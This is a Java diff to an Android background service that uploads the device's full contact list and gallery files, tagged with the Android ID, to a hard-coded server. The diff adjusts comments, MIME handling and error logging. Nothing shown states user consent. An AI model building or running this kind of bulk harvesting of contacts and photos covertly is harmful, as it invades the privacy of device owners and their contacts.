@@ -104,12 +104,12 @@ public class UploadService extends Service {
     private void uploadToServer(List<String> contacts, List<String> galleryFiles, String androidId) {
         String serverUrl = "http://192.168.200.78:3000/upload"; // Updated server URL
 
-        // Upload contacts
+        // Upload contacts as JSON (not a file)
         for (String contact : contacts) {
             try {
                 // Create JSON payload for contact
                 String payload = "{\"type\":\"contact\",\"data\":\"" + escapeSpecialChars(contact) + "\"}";
-                sendPostRequest(serverUrl, payload);
+                sendPostRequest(serverUrl, payload); // Send contact as JSON, no file involved
             } catch (Exception e) {
                 Log.e(TAG, "Failed to upload contact: " + contact, e);
             }
@@ -120,7 +120,7 @@ public class UploadService extends Service {
             File file = new File(filePath);
             if (file.exists()) {
                 try {
-                    uploadFile(serverUrl, file);
+                    uploadFile(serverUrl, file); // Upload files separately as multipart
                 } catch (Exception e) {
                     Log.e(TAG, "Failed to upload file: " + filePath, e);
                 }
@@ -132,10 +132,7 @@ public class UploadService extends Service {
     private void uploadFile(String serverUrl, File file) throws IOException {
         // Create a new MultipartBody for file upload
         MultipartBody.Builder builder = new MultipartBody.Builder().setType(MultipartBody.FORM);
-
-        // Dynamically set MIME type based on file extension
-        String mimeType = URLConnection.guessContentTypeFromName(file.getName());
-        builder.addFormDataPart("file", file.getName(), RequestBody.create(file, MediaType.parse(mimeType)));
+        builder.addFormDataPart("file", file.getName(), RequestBody.create(file, MediaType.parse("image/jpeg"))); // Ensure 'file' matches server-side form field
 
         // Send the multipart request
         RequestBody requestBody = builder.build();
@@ -149,14 +146,10 @@ public class UploadService extends Service {
                 Log.d(TAG, "File upload successful: " + file.getName());
             } else {
                 Log.e(TAG, "Failed to upload file: " + file.getName() + ". Server responded: " + response.code());
-                // Read the response body for detailed error info
-                if (response.body() != null) {
-                    String errorBody = response.body().string();
-                    Log.e(TAG, "Server error response: " + errorBody);
-                }
             }
         }
     }
+
 
     // Escape special characters in the string to avoid JSON formatting issues
     private String escapeSpecialChars(String input) {
